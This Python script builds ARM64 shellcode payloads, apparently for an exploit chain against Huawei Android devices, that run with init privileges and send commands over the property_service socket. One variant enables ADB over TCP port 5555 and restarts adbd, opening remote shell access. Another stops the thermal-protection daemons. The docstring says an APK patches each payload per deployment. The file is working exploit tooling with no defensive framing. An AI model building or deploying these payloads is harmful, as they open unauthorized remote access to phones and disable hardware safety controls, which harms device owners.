#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Payload PROPS: init payloads that talk to /dev/socket/property_service.

Variants (all 576 bytes, direct-return):
  adb   one-shot marker + service.adb.tcp.port=5555 + ctl.restart=adbd
  thoff sys.huawei.thermal.enable=false + ctl.stop=hwpged/thermal-daemon/powerct
  thon  sys.huawei.thermal.enable=true  + ctl.start=hwpged/thermal-daemon/powerct

The marker is /dev/.d<xx>; the APK overwrites the last two marker bytes with a
per-deployment suffix so every tap gets a fresh one-shot marker.
"""
import struct
import sys

from keystone import Ks, KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN

END = 0x240
FORBIDDEN = (0x204, 0x220)
NOP4 = bytes([0x1f, 0x20, 0x03, 0xd5])

CODE = """
    stp x0, x30, [sp, #-0x10]!
    stp x19, x20, [sp, #-0x10]!
    stp x21, x22, [sp, #-0x10]!
    mov x8, #0xae
    svc #0
    cbnz w0, ret_early
    mov x8, #0xac
    svc #0
    cmp w0, #1
    b.ne ret_early

    mov x0, #-100
    adr x1, marker
    mov x2, #0xc1
    mov x3, #0
    mov x8, #56
    svc #0
    tbnz x0, #63, ret_early
    mov x8, #57
    svc #0

    sub sp, sp, #0x40
    stp xzr, xzr, [sp]
    stp xzr, xzr, [sp, #0x10]
    stp xzr, xzr, [sp, #0x20]
    stp xzr, xzr, [sp, #0x30]
    mov w9, #1
    strh w9, [sp, #6]
    adr x9, sockpath
    ldp x10, x11, [x9]
    ldp x12, x13, [x9, #0x10]
    stp x10, x11, [sp, #8]
    stp x12, x13, [sp, #24]

    adr x20, msgtab
    mov x21, x20
    mov x22, #NMSG
loop:
    ldp w9, w10, [x21], #8
    mov x0, #1
    mov x1, #1
    mov x2, xzr
    mov x8, #198
    svc #0
    tbnz x0, #63, ret_sp_add
    mov x19, x0
    mov x0, x19
    mov x1, sp
    add x1, x1, #6
    mov x2, #31
    mov x8, #203
    svc #0
    tbnz x0, #63, close_and_next
    add x1, x20, x9
    mov x2, x10
    mov x0, x19
    mov x8, #64
    svc #0
close_and_next:
    mov x0, x19
    mov x8, #57
    svc #0
    subs w22, w22, #1
    b.ne loop

    add sp, sp, #0x40
    b ret_early

ret_sp_add:
    add sp, sp, #0x40
ret_early:
    ldp x21, x22, [sp], #0x10
    ldp x19, x20, [sp], #0x10
    ldp x0, x30, [sp], #0x10
    ret
"""

SOCKPATH_S = b"/dev/socket/property_service\x00"


def wire(name: bytes, value: bytes) -> bytes:
    return (struct.pack("<I", 0x00020001) + struct.pack("<I", len(name)) + name
            + struct.pack("<I", len(value)) + value)


VARIANTS = {
    "adb": dict(marker=b"/dev/.daa\x00", msgs=[
        wire(b"service.adb.tcp.port", b"5555"),
        wire(b"ctl.restart", b"adbd"),
    ]),
    "thoff": dict(marker=b"/dev/.dof\x00", msgs=[
        wire(b"sys.huawei.thermal.enable", b"false"),
        wire(b"ctl.stop", b"hwpged"),
        wire(b"ctl.stop", b"thermal-daemon"),
        wire(b"ctl.stop", b"powerct"),
    ]),
    "thon": dict(marker=b"/dev/.don\x00", msgs=[
        wire(b"sys.huawei.thermal.enable", b"true"),
        wire(b"ctl.start", b"hwpged"),
        wire(b"ctl.start", b"thermal-daemon"),
        wire(b"ctl.start", b"powerct"),
    ]),
}


def align(x, a=8):
    return (x + a - 1) // a * a


def byte_directive(data):
    return ".byte " + ", ".join("0x%02x" % b for b in data)


def build(variant):
    v = VARIANTS[variant]
    msgs = v["msgs"]
    blob_msgs = b"".join(msgs)
    ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN)
    code = CODE.replace("#NMSG", "#%d" % len(msgs))
    probe = code + "\nmarker:\nsockpath:\nmsgtab:\nmsgblob:\n"
    code_len = len(ks.asm(probe, addr=0)[0])

    table_len = 8 * len(msgs)
    data_start = align(code_len)
    lo, hi = FORBIDDEN
    p = data_start
    place = {}
    for name, blob in (("table", bytes(table_len)), ("blob", blob_msgs),
                       ("marker", v["marker"]), ("sockpath", SOCKPATH_S)):
        p = align(p)
        if p < hi and p + len(blob) > lo:
            p = align(hi)
        place[name] = p
        p += len(blob)
    end = p
    if end > END:
        raise SystemExit("overflow end=%#x code=%#x" % (end, code_len))

    off = place["blob"] - place["table"]
    table = bytearray()
    for m in msgs:
        table += off.to_bytes(4, "little") + len(m).to_bytes(4, "little")
        off += len(m)

    segs = [
        (place["table"], "msgtab:", table),
        (place["blob"], "msgblob:", blob_msgs),
        (place["marker"], "marker:", v["marker"]),
        (place["sockpath"], "sockpath:", SOCKPATH_S),
        (FORBIDDEN[0], None, NOP4 * 7),
    ]
    segs.sort(key=lambda s_: s_[0])
    parts = [code]
    cur = 0
    for pos_, label, data_ in segs:
        assert pos_ >= cur
        parts.append(".org 0x%x" % pos_)
        if label:
            parts.append(label)
        parts.append(byte_directive(data_))
        cur = pos_ + len(data_)
    parts.append(".org 0x%x" % END)
    blob = bytes(ks.asm("\n".join(parts), addr=0)[0])
    if len(blob) != END:
        raise SystemExit("size %#x" % len(blob))
    meta = dict(variant=variant, code_len=code_len, end=end,
                marker=place["marker"], marker_suffix=place["marker"] + 7,
                table=place["table"], blob=place["blob"],
                sockpath=place["sockpath"])
    return blob, meta


if __name__ == "__main__":
    for variant in VARIANTS:
        blob, meta = build(variant)
        out = "payload_576_%s.bin" % variant
        open(out, "wb").write(blob)
        print(variant, "size", len(blob), {k: (hex(v) if isinstance(v, int) else v)
                                           for k, v in meta.items()})
        print("  entry", blob[0:16].hex())
